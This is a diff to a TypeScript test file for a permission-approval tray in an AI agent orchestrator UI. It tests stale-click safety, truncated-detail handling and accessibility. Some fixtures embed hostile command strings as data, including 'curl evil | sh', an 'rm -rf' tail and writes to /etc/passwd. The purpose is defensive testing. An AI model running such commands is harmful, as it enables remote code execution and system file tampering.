@@ -27,15 +27,16 @@ function thread(id: string, over: Partial<Thread> = {}): Thread {
   return { id, title: `Thread ${id}`, cwd: '/r', messages: [{ id: `m-${id}`, role: 'assistant', content: 'hi', timestamp: 0 }], createdAt: 0, updatedAt: 0, status: 'waiting', reviewed: true, ...over } as Thread;
 }
 
-function setup(opts: { specs?: Spec[]; mode?: 'pill' | 'orb'; permissionCard?: boolean; open?: boolean; allowAlways?: boolean } = {}) {
+function setup(opts: { specs?: Spec[]; mode?: 'pill' | 'orb'; permissionCard?: boolean; open?: boolean; allowAlways?: boolean; remote?: boolean; saveSettings?: () => Promise<void>; hideOrchestratorFromList?: boolean } = {}) {
   const specs = opts.specs ?? DEFAULT;
   const orch = thread('orch', { title: 'Portfolio Orchestrator' });
   const threads: Thread[] = [orch, ...specs.map((s) => thread(s.id, { title: s.title, ...(s.kind === 'failed' ? { lastError: 'boom' } : {}) }))];
-  const perms = new Map<string, { toolName: string; detail: string }>();
+  let promptSeq = 0;
+  const perms = new Map<string, { toolName: string; detail: string; promptId?: number }>();
   const questions = new Set<string>();
   const plans = new Set<string>();
   for (const s of specs) {
-    if (s.kind === 'permission') perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}' });
+    if (s.kind === 'permission') perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}', promptId: ++promptSeq });
     if (s.kind === 'question') questions.add(s.id);
     if (s.kind === 'plan') plans.add(s.id);
   }
@@ -55,16 +56,16 @@ function setup(opts: { specs?: Spec[]; mode?: 'pill' | 'orb'; permissionCard?: b
     interrupt: vi.fn(async () => {}),
     sendMessage: vi.fn(async () => {}),
     getPendingPermission: vi.fn((id: string) => perms.get(id)),
-    getRemoteScope: vi.fn(() => null),
+    getRemoteScope: vi.fn(() => (opts.remote ? { daemonId: 'd1' } : null)),
     // Real manager: the resolver settles the prompt; promptPermission's finally emits permission_resolved.
     resolvePermission: vi.fn((id: string) => { perms.delete(id); emit(id, 'permission_resolved'); }),
     subscribe: vi.fn((l: Listener) => { listeners.add(l); return () => { listeners.delete(l); }; }),
   };
   const settings = { alwaysAllowedTools: [] as string[], hostExecAlwaysAllowedPrefixes: [] as string[] };
-  const saveSettings = vi.fn(async () => {});
+  const saveSettings = vi.fn(opts.saveSettings ?? (async () => {}));
   const deps: OrchestratorDockDeps = {
     manager: manager as never,
-    listThreads: () => threads,
+    listThreads: () => (opts.hideOrchestratorFromList ? threads.filter((t) => t.id !== 'orch') : threads),
     hasPendingWakeup: () => false,
     getOrchestratorThreadId: () => 'orch',
     ensureOrchestrator: vi.fn(async () => {}),
@@ -89,17 +90,20 @@ function setup(opts: { specs?: Spec[]; mode?: 'pill' | 'orb'; permissionCard?: b
     cards: () => qa('.ct-orch-tray-card'),
     card: (id: string) => q(`.ct-orch-tray-card[data-thread-id="${id}"]`),
     btn: (id: string, name: RegExp | string) => qa(`.ct-orch-tray-card[data-thread-id="${id}"] button`).find((b) => (typeof name === 'string' ? b.textContent === name : name.test(b.textContent ?? ''))),
-    live: () => q('.ct-orch-live')!.textContent,
+    /** Tray announcements have their own polite region (the sheet's .ct-orch-live is for streaming / finished replies). */
+    live: () => q('.ct-orch-tray-live')?.textContent ?? '',
+    sheetLive: () => q('.ct-orch-live')!.textContent,
     /** The board resolving it (or any other surface): the manager state changes, the manager emits. */
     resolveElsewhere: (id: string) => { perms.delete(id); emit(id, 'permission_resolved'); },
     addPermission: (s: Spec) => {
       threads.push(thread(s.id, { title: s.title }));
-      perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}' });
+      perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}', promptId: ++promptSeq });
       emit(s.id, 'permission_request', { toolName: s.tool ?? 'Bash' });
     },
   };
 }
 const flush = () => new Promise((r) => setTimeout(r, 0));
+const tick = () => new Promise((r) => setTimeout(r, 20));
 
 beforeEach(() => { document.body.innerHTML = ''; });
 
@@ -347,13 +351,14 @@ describe('collapse beyond three', () => {
 });
 
 describe('announcements and focus', () => {
-  it('a new request is announced politely as "<title> needs approval" and does not move focus', () => {
+  it('a new request is announced politely as "<title> needs approval" and does not move focus', async () => {
     const t = setup();
     const input = t.q<HTMLTextAreaElement>('textarea.ct-orch-input')!;
     input.focus();
     t.addPermission({ id: 'n', title: 'Ship the thing', kind: 'permission' });
+    await tick();
     expect(t.live()).toBe('Ship the thing needs approval');
-    expect(t.q('.ct-orch-live')!.getAttribute('aria-live')).toBe('polite');
+    expect(t.q('.ct-orch-tray-live')!.getAttribute('aria-live')).toBe('polite');
     expect(document.activeElement).toBe(input);
   });
 
@@ -362,13 +367,14 @@ describe('announcements and focus', () => {
     expect(t.live()).toBe('');
   });
 
-  it('a resolved-then-requested thread is announced again; unrelated refreshes announce nothing', () => {
+  it('a resolved-then-requested thread is announced again; unrelated refreshes announce nothing', async () => {
     const t = setup();
     t.dock.refresh();
     expect(t.live()).toBe('');
     t.resolveElsewhere('p');
-    t.perms.set('p', { toolName: 'Bash', detail: 'again' });
+    t.perms.set('p', { toolName: 'Bash', detail: 'again', promptId: 99 });
     t.emit('p', 'permission_request');
+    await tick();
     expect(t.live()).toBe('Deploy curation needs approval');
   });
 
@@ -412,5 +418,294 @@ describe('lifecycle', () => {
     t.dock.destroy();
     expect(t.tray()).toBeNull();
     expect(() => t.emit('p', 'permission_resolved')).not.toThrow();
+  });
+});
+
+
+// ── approval safety: a click may only resolve the prompt the user SAW ────────────────────────────────────────────────
+
+describe('stale-click safety (a click resolves only the request that was on screen)', () => {
+  it('Always, then the queue advances during the settings await: resolves NOTHING and persists nothing for the new prompt', async () => {
+    let t!: ReturnType<typeof setup>;
+    // While Always awaits saveSettings, the board's Deny settled A and B (other tool, other detail) took the front.
+    t = setup({
+      specs: [DEFAULT[0]],
+      saveSettings: async () => { t.perms.set('p', { toolName: 'Write', detail: 'B: /etc/passwd', promptId: 2 }); },
+    });
+    t.btn('p', 'Always')!.click();
+    await flush();
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+    expect(t.settings.alwaysAllowedTools).toEqual(['Bash']); // only what the user saw and chose; never B's tool
+    expect(t.settings.alwaysAllowedTools).not.toContain('Write');
+  });
+
+  it('Always `prefix` with the same race: nothing resolved, B\'s command is never recorded', async () => {
+    let t!: ReturnType<typeof setup>;
+    t = setup({
+      specs: [{ id: 'h', title: 'Remote job', kind: 'permission', tool: 'mcp__claude_threads__host_exec', detail: HOST_EXEC_DETAIL }],
+      saveSettings: async () => { t.perms.set('h', { toolName: 'mcp__claude_threads__host_exec', detail: `Run host_exec for a remote thread: ${JSON.stringify({ command: 'git push' })}`, promptId: 2 }); },
+    });
+    t.btn('h', /^Always `git status`/)!.click();
+    await flush();
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+    expect(t.settings.hostExecAlwaysAllowedPrefixes).toEqual(['git status']);
+  });
+
+  it('double Allow with an identical queued B resolves exactly once (the first click disables the card)', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    // The manager settles A, then the queue immediately raises B with the SAME tool and detail.
+    t.manager.resolvePermission.mockImplementation((id: string) => {
+      t.perms.delete(id); t.emit(id, 'permission_resolved');
+      t.perms.set(id, { toolName: 'Bash', detail: 'npm run deploy --prod', promptId: 2 }); t.emit(id, 'permission_request');
+    });
+    const first = t.btn('p', 'Allow')!;
+    first.click();
+    first.click();
+    await flush();
+    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
+    // B is a NEW card with live, untouched buttons: it still needs its own decision.
+    const fresh = t.btn('p', 'Allow')!;
+    expect(fresh).not.toBe(first);
+    expect(fresh.disabled).toBe(false);
+  });
+
+  it('the first click disables every button of the card', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    t.manager.resolvePermission.mockImplementation(() => {}); // an action that does not settle the prompt
+    t.btn('p', 'Deny')!.click();
+    const all = [...t.card('p')!.querySelectorAll<HTMLButtonElement>('.ct-orch-tray-actions button')];
+    expect(all.length).toBeGreaterThan(0);
+    all.forEach((b) => expect(b.disabled).toBe(true));
+  });
+
+  it('re-enables the buttons only if the request is still pending afterwards (the action did not take)', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    t.manager.resolvePermission.mockImplementation(() => {}); // still pending
+    t.btn('p', 'Allow')!.click();
+    await tick();
+    expect(t.btn('p', 'Allow')!.disabled).toBe(false);
+    const t2 = setup({ specs: [DEFAULT[0]] }); // real behaviour: resolved -> card leaves
+    t2.btn('p', 'Allow')!.click();
+    await tick();
+    expect(t2.card('p')).toBeNull();
+  });
+
+  it('a stale click after the tool / detail changed does nothing and refreshes the card to what is pending now', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    // The prompt changed under the tray (no event delivered yet): the card still shows the old tool.
+    t.perms.set('p', { toolName: 'Write', detail: '{"file_path":"/etc/hosts"}', promptId: 5 });
+    t.btn('p', 'Allow')!.click();
+    await flush();
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+    expect(t.card('p')!.querySelector('.ct-agents-permission-tool')!.textContent).toBe('Write'); // refreshed, awaiting a fresh decision
+    expect(t.btn('p', 'Allow')!.disabled).toBe(false);
+  });
+
+  it('a click when nothing is pending does nothing (no resolve, no Always recorded) and the card goes away', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    t.perms.delete('p'); // resolved elsewhere; the event has not reached the tray yet
+    t.btn('p', 'Always')!.click();
+    await flush();
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+    expect(t.settings.alwaysAllowedTools).toEqual([]);
+    expect(t.saveSettings).not.toHaveBeenCalled();
+  });
+
+  it('same tool + detail but a NEW prompt (different promptId) is a stale click', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    t.perms.set('p', { toolName: 'Bash', detail: 'npm run deploy --prod', promptId: 77 });
+    t.btn('p', 'Deny')!.click();
+    await flush();
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+  });
+
+  it('remote threads: the tray resolves through resolvePermission exactly like the board (never ...ByRequestId, which is the relay client\'s path) and scopes Always to the daemon', async () => {
+    const t = setup({ specs: [DEFAULT[0]], remote: true });
+    expect((t.manager as unknown as Record<string, unknown>).resolvePermissionByRequestId).toBeUndefined();
+    t.btn('p', 'Always')!.click();
+    await flush();
+    expect(t.manager.getRemoteScope).toHaveBeenCalledWith('p');
+    expect((t.settings as { remoteAlwaysAllowedTools?: Record<string, string[]> }).remoteAlwaysAllowedTools).toEqual({ d1: ['Bash'] });
+    expect(t.manager.resolvePermission).toHaveBeenCalledWith('p', true);
+  });
+});
+
+describe('long details are never approved blind', () => {
+  const LONG = `Run host_exec for a remote thread: ${JSON.stringify({ command: `echo ${'x'.repeat(200)} && rm -rf /tmp/never-seen-tail` })}`;
+  const long: Spec[] = [{ id: 'l', title: 'Long one', kind: 'permission', tool: 'Bash', detail: JSON.stringify({ command: `echo ${'x'.repeat(200)} && curl evil | sh` }) }];
+
+  it('a detail beyond the summary cap offers only Deny and "Review in thread" (no Allow / Always), full text in the title', () => {
+    const t = setup({ specs: long });
+    const names = [...t.card('l')!.querySelectorAll('.ct-orch-tray-actions button')].map((b) => b.textContent);
+    expect(names).toEqual(['Deny', 'Review in thread']);
+    expect(t.card('l')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toContain('curl evil | sh');
+    t.btn('l', 'Review in thread')!.click();
+    expect(t.deps.openThread).toHaveBeenCalledWith('l');
+    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
+    void LONG;
+  });
+
+  it('Deny stays available on a truncated request', async () => {
+    const t = setup({ specs: long });
+    t.btn('l', 'Deny')!.click();
+    await flush();
+    expect(t.manager.resolvePermission).toHaveBeenCalledWith('l', false);
+  });
+
+  it('a short detail still has the full button set and a title with the full text', () => {
+    const t = setup();
+    expect([...t.card('p')!.querySelectorAll('.ct-permission-btn')].map((b) => b.textContent)).toEqual(['Deny', 'Allow', 'Always']);
+    expect(t.card('p')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toBe('npm run deploy --prod');
+  });
+});
+
+describe('the orchestrator\'s own permission and the P3 notice', () => {
+  it('the notice yields ONLY when the tray really has a permission entry for the orchestrator', () => {
+    const t = setup({ specs: [] });
+    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
+    t.emit('orch', 'permission_request');
+    expect(t.card('orch')).toBeTruthy();
+    expect(t.q('.ct-orch-notice')).toBeNull();
+  });
+
+  it('a `background` orchestrator that the board does not list is still listed in the tray, and the notice yields', () => {
+    const t = setup({ specs: [], hideOrchestratorFromList: true });
+    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
+    t.emit('orch', 'permission_request');
+    expect(t.card('orch')).toBeTruthy();
+    expect(t.btn('orch', 'Deny')).toBeTruthy();
+    expect(t.q('.ct-orch-notice')).toBeNull();
+  });
+
+  it('without permissionCard deps the tray has only a hand-off entry, so the notice stays', () => {
+    const t = setup({ specs: [], permissionCard: false });
+    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
+    t.emit('orch', 'permission_request');
+    expect(t.card('orch')!.querySelector('.ct-orch-tray-actions button')!.textContent).toBe('Open thread…');
+    expect(t.q('.ct-orch-notice')).toBeTruthy();
+  });
+
+  it('a pending permission whose pending info vanished leaves the notice in place (no tray buttons to take over)', () => {
+    const t = setup({ specs: [] });
+    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
+    t.manager.hasPendingPermission = (id: string) => id === 'orch';
+    t.perms.delete('orch');
+    t.emit('orch', 'permission_request');
+    expect(t.q('.ct-orch-notice')).toBeTruthy();
+  });
+});
+
+describe('announcements: their own region, re-announced, capped', () => {
+  it('go to a dedicated polite region and never touch the sheet\'s streaming / reply region', async () => {
+    const t = setup({ specs: [] });
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
+    await tick();
+    expect(t.live()).toBe('Ship it needs approval');
+    expect(t.q('.ct-orch-tray-live')!.getAttribute('aria-live')).toBe('polite');
+    expect(t.q('.ct-orch-tray-live')!.closest('.ct-orch-sheet')).toBeTruthy();
+    expect(t.sheetLive()).toBe('');
+  });
+
+  it('identical repeated text is announced again (the region is cleared before it is set)', async () => {
+    const t = setup({ specs: [] });
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
+    await tick();
+    const seen: string[] = [];
+    new MutationObserver(() => seen.push(t.live())).observe(t.q('.ct-orch-tray-live')!, { childList: true, characterData: true, subtree: true });
+    t.resolveElsewhere('n');
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
+    await tick();
+    expect(t.live()).toBe('Ship it needs approval');
+    expect(seen).toContain(''); // cleared in between, so assistive tech sees a change
+  });
+
+  it('several arriving at once are capped: two named, the rest counted', async () => {
+    const t = setup({ specs: [] });
+    for (let i = 0; i < 5; i++) t.addPermission({ id: `n${i}`, title: `T${i}`, kind: 'permission' });
+    await tick();
+    const text = t.live();
+    expect(text.length).toBeLessThan(120);
+    expect(text).toMatch(/and \d+ more/);
+  });
+
+  it('a #903 streaming announcement and a tray announcement do not overwrite each other', async () => {
+    const t = setup({ specs: [] });
+    t.q('.ct-orch-live')!.textContent = 'Orchestrator replied: hello';
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
+    await tick();
+    expect(t.sheetLive()).toBe('Orchestrator replied: hello');
+    expect(t.live()).toBe('Ship it needs approval');
+  });
+});
+
+describe('queued permissions on one thread (resolved -> next request)', () => {
+  it('never drops focus to <body> across the gap, and announces only the genuinely new prompt', async () => {
+    const t = setup({ specs: [DEFAULT[0]] });
+    t.btn('p', 'Deny')!.focus();
+    t.resolveElsewhere('p'); // card gone between permission_resolved and the next permission_request
+    expect(document.activeElement).not.toBe(document.body);
+    expect(t.stage.contains(document.activeElement)).toBe(true);
+    t.perms.set('p', { toolName: 'Bash', detail: 'second prompt', promptId: 2 });
+    t.emit('p', 'permission_request');
+    await tick();
+    expect(t.card('p')!.querySelector('.ct-agents-permission-detail')!.textContent).toBe('second prompt');
+    expect(t.live()).toBe('Deploy curation needs approval');
+    t.dock.refresh();
+    t.emit('q', 'pending_question_changed');
+    await tick();
+    expect(t.live()).toBe('Deploy curation needs approval'); // unchanged, and no extra announcement was queued
+  });
+});
+
+describe('narrow modal sheet: Show N more inside the focus trap', () => {
+  const five: Spec[] = Array.from({ length: 5 }, (_, i) => ({ id: `t${i}`, title: `Thread ${i}`, kind: 'permission' as const, tool: 'Bash', detail: `cmd ${i}` }));
+
+  it('the toggle is one of the trap\'s stops, and Tab wraps from the last control back inside the sheet', () => {
+    const t = setup({ specs: five, mode: 'orb' });
+    const sheet = t.q('.ct-orch-sheet')!;
+    const stops = () => [...sheet.querySelectorAll<HTMLElement>('button, a[href], textarea, input')].filter((n) => !n.hidden && !n.closest('[hidden]') && !(n as HTMLButtonElement).disabled);
+    expect(stops()).toContain(t.q('.ct-orch-tray-toggle'));
+    t.q<HTMLButtonElement>('.ct-orch-tray-toggle')!.click();
+    expect(t.cards()).toHaveLength(5);
+    const last = stops().pop()!;
+    last.focus();
+    const ev = new KeyboardEvent('keydown', { key: 'Tab', bubbles: true, cancelable: true });
+    sheet.dispatchEvent(ev);
+    expect(ev.defaultPrevented).toBe(true);
+    expect(sheet.contains(document.activeElement)).toBe(true);
+  });
+});
+
+describe('the transcript stays pinned across the tray appearing / disappearing', () => {
+  /** The scroller is 1000px tall without the tray and 800px with it (the tray takes room from the transcript). */
+  function stubScroll(t: ReturnType<typeof setup>) {
+    const scroll = t.q('.ct-orch-sheet-scroll')!;
+    let top = 0;
+    const height = () => (t.q('.ct-orch-tray') ? 800 : 1000);
+    Object.defineProperty(scroll, 'scrollHeight', { configurable: true, get: height });
+    Object.defineProperty(scroll, 'clientHeight', { configurable: true, get: () => 300 });
+    Object.defineProperty(scroll, 'scrollTop', { configurable: true, get: () => top, set: (v: number) => { top = Math.min(v, height() - 300); } });
+    return { scroll, top: () => top, setTop: (v: number) => { top = v; } };
+  }
+
+  it('pinned to the latest message before: re-pinned after the tray resized the transcript', async () => {
+    const t = setup({ specs: [] });
+    const s = stubScroll(t);
+    s.setTop(700); // at the bottom (1000 - 300)
+    s.scroll.dispatchEvent(new Event('scroll'));
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' }); // the tray appears AFTER the transcript rendered: the bottom is now 500
+    expect(s.top()).toBe(500);
+    t.resolveElsewhere('n'); // and goes away again: the bottom is back at 700
+    expect(s.top()).toBe(700);
+  });
+
+  it('the user had scrolled up: the tray changing does not yank them back down', async () => {
+    const t = setup({ specs: [] });
+    const s = stubScroll(t);
+    s.scroll.dispatchEvent(new WheelEvent('wheel'));
+    s.setTop(100);
+    s.scroll.dispatchEvent(new Event('scroll'));
+    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
+    expect(s.top()).toBe(100);
   });
 });
